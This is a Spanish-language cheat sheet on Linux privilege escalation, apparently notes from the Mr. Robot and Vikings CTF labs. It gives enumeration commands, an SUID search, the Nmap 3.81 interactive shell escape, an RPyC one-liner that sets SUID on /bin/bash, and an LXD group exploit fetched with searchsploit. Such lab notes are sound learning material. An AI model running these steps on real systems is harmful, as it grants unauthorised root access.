Post-explotación y Escalada

← Volver al catálogo

Enumeración del sistema, búsqueda de vectores de escalada y ejecución de exploits para obtener privilegios de root.

🔎

Enumeración del sistema

Reconocimiento

Comandos para recopilar información del sistema tras obtener acceso inicial.

$ whoami
$ id
$ groups
$ ps aux | grep [servicio]
$ ls -la /
$ find /home /var /etc /root -name "*.txt" 2>/dev/null
🔑

Binarios SUID

Escalada

Localización de ejecutables con permisos SUID que pueden ser explotados para elevar privilegios.

$ find / -user root -perm -4000 -type f 2>/dev/null

Utilizado en Mr. Robot para descubrir que nmap tiene el bit SUID activo.

🔓

Nmap (SUID)

Escalada

Explotación de la versión 3.81 de Nmap con modo interactivo para obtener una shell como root.

$ nmap --version
$ nmap --interactive
nmap> !sh
# whoami

Vulnerabilidad presente en la versión 3.81 de Nmap. Permite ejecutar comandos con prefijo ! desde el modo interactivo.

🐍

RPyC

Escalada

Explotación de un servicio RPyC mal configurado que se ejecuta como root (Vikings CTF).

$ ps aux | grep rpyc
$ python3 -c 'import rpyc; c = rpyc.classic.connect("127.0.0.1", port=18812); c.modules.os.system("chmod +s /bin/bash")'
$ /bin/bash -p

El comando asigna el bit SUID a /bin/bash permitiendo ejecutarlo con privilegios de root.

📦

LXD

Escalada

Abuso del grupo LXD para montar el sistema de archivos del host dentro de un contenedor y escalar privilegios (Vikings CTF).

$ searchsploit lxd
$ searchsploit -m linux/local/46978.sh
$ bash 46978.sh alpine.tar.gz

El exploit crea un contenedor con acceso al sistema de archivos raíz del host, permitiendo obtener una shell con privilegios de root.

📂

Comandos post-root

Exploración

Comandos utilizados una vez obtenidos privilegios de root para navegar y localizar flags.

# ls -la /root
# cat /root/root.txt
# find / -name "key-3-of-3.txt" 2>/dev/null
